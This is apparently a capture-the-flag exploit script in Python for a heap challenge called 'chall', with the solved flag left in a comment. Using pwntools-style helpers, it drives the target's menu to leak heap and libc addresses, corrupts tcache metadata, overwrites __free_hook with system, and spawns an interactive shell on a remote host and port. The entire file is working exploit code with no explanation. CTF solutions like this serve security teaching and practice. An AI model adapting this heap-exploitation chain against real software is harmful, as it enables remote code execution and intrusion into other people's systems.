#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'69.90.132.248', 'port':1337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    ref = Refcnt(conn)

    ref.new(0, 0x10)
    ref.copy(0, 0)
    addr_heap_base = u(ref.print(0)) - 0x10
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    ref.edit(0, p(0xdeadbeef))
    ref.copy(0, 0)
    ref.new(1, 0x10)
    ref.new(2, 0x10)
    ref.delete(1)

    ref.new(3, 0x20)
    ref.new(4, 0xf0)
    ref.delete(4)
    ref.new(4, 0xe0)
    ref.delete(4)
    ref.new(4, 0xd0)
    ref.delete(4)
    ref.new(4, 0xc0)
    ref.delete(4)
    ref.new(4, 0xb0)
    ref.delete(4)
    ref.new(4, 0x20)
    ref.delete(4)
    ref.new(4, 0xf0)

    ref.edit(2, '2'*0xf + chr(0x41))
    ref.new(3, 0x30)
    ref.edit(3, b'3'*0x20 + p64(0x461))
    ref.delete(4)

    ref.new(1, 0x10)
    addr_libc_mainarena = u(ref.print(1)) - 0x460
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    ref.copy(1, 1)
    ref.edit(1, p64(0xdeadbeef))
    ref.copy(1, 1)
    ref.edit(3, b'3'*0x20 + p64(0x21) + p64(addr_libc_free_hook-8))

    ref.new(0, 0x10)
    ref.new(4, 0x10)
    ref.edit(4, p64(addr_libc_system))

    ref.edit(3, b'3'*0x20 + p64(0x21) + p64(u64(b'sh\x00'.ljust(8, b'\xff'))+1))
    ref.delete(0)

class Refcnt:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def new(self, idx, size):
        self.sendlineafter('Choice: ', '1')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter('Size: ', str(size))

    def edit(self, idx, data):
        self.sendlineafter('Choice: ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.sendafter('Data: ', data)

    def copy(self, idx_from, idx_to):
        self.sendlineafter('Choice: ', '3')
        self.sendlineafter('From: ', str(idx_from))
        self.sendlineafter('To: ', str(idx_to))

    def print(self, idx):
        self.sendlineafter('Choice: ', '4')
        self.sendlineafter('Index: ', str(idx))
        self.recvuntil('print: ')
        ret = self.recvuntil('\nChoice: ', drop=True)
        self.unrecv('Choice: ')
        return ret

    def delete(self, idx):
        self.sendlineafter('Choice: ', '5')
        self.sendlineafter('Index: ', str(idx))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # ASIS{r3f3r3nc3_c0unt1n9_1s_h4rD_4_pr0gr4Mm3rs}

if __name__=='__main__':
    main()

#==========
